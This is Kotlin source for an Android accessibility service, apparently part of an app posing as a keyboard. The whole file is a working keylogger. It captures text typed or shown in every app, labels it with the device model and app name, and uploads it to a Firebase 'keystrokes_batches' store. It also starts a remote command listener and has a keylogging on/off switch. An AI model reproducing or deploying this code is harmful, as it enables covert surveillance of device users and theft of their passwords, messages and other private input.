package com.example.mykeyboard

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.os.Build
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import androidx.annotation.RequiresApi
import com.google.firebase.FirebaseApp
import com.google.firebase.database.DatabaseReference
import com.google.firebase.database.FirebaseDatabase
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

@RequiresApi(Build.VERSION_CODES.LOLLIPOP)
class AppAccessibilityService : AccessibilityService() {
    companion object {
        private const val TAG = "AppAccessibilityService"
        private val scope = CoroutineScope(Dispatchers.IO)
        private fun getDatabaseRef(deviceName: String): DatabaseReference? = try {
            FirebaseDatabase.getInstance().getReference().child("keystrokes_batches").child(deviceName)
        } catch (e: Exception) {
            Log.e(TAG, "Error getting database ref", e)
            null
        }
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        try {
            FirebaseApp.initializeApp(applicationContext)
            RemoteCommandListener.startListening()

            val info = AccessibilityServiceInfo().apply {
                eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or
                        AccessibilityEvent.TYPE_VIEW_FOCUSED or
                        AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or
                        AccessibilityEvent.TYPE_VIEW_SELECTED
                feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
                flags = AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS or AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
                notificationTimeout = 50
            }
            serviceInfo = info
            Log.d(TAG, "Smart Accessibility Service Connected")
            LogStore.addLog("Smart Accessibility Service Active")
        } catch (e: Exception) {
            Log.e(TAG, "Error in onServiceConnected", e)
        }
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (!KeyloggingConfig.isEnabled) return
        if (event == null) return
        try {
            val packageName = event.packageName?.toString() ?: "unknown"
            val textList = event.text

            if (textList.isNullOrEmpty()) return
            val typedText = textList.joinToString(" ")

            if (typedText.isBlank()) return

            scope.launch {
                try {
                    val deviceName = Build.MODEL?.replace(Regex("[^a-zA-Z0-9_-]"), "_")?.ifBlank { "Unknown_Device" } ?: "Unknown_Device"
                    val ref = getDatabaseRef(deviceName) ?: return@launch
                    val timestampKey = SimpleDateFormat("yyyy-MM-dd_HH-mm-ss_SSS", Locale.getDefault()).format(Date())
                    val sanitizedAppName = packageName.replace(Regex("[^a-zA-Z0-9_-]"), "_")

                    val eventData = mapOf(
                        "deviceName" to deviceName,
                        "packageName" to sanitizedAppName,
                        "text" to typedText,
                        "timestamp" to System.currentTimeMillis()
                    )

                    ref.child("accessibility_$sanitizedAppName").child(timestampKey).setValue(eventData)
                        .addOnSuccessListener {
                            Log.d(TAG, "Activity synced to Firebase")
                            LogStore.addLog("[$deviceName] Activity ($sanitizedAppName): $typedText")
                        }
                } catch (e: Exception) {
                    Log.e(TAG, "Error in accessibility coroutine", e)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error in onAccessibilityEvent", e)
        }
    }

    override fun onInterrupt() {}
}
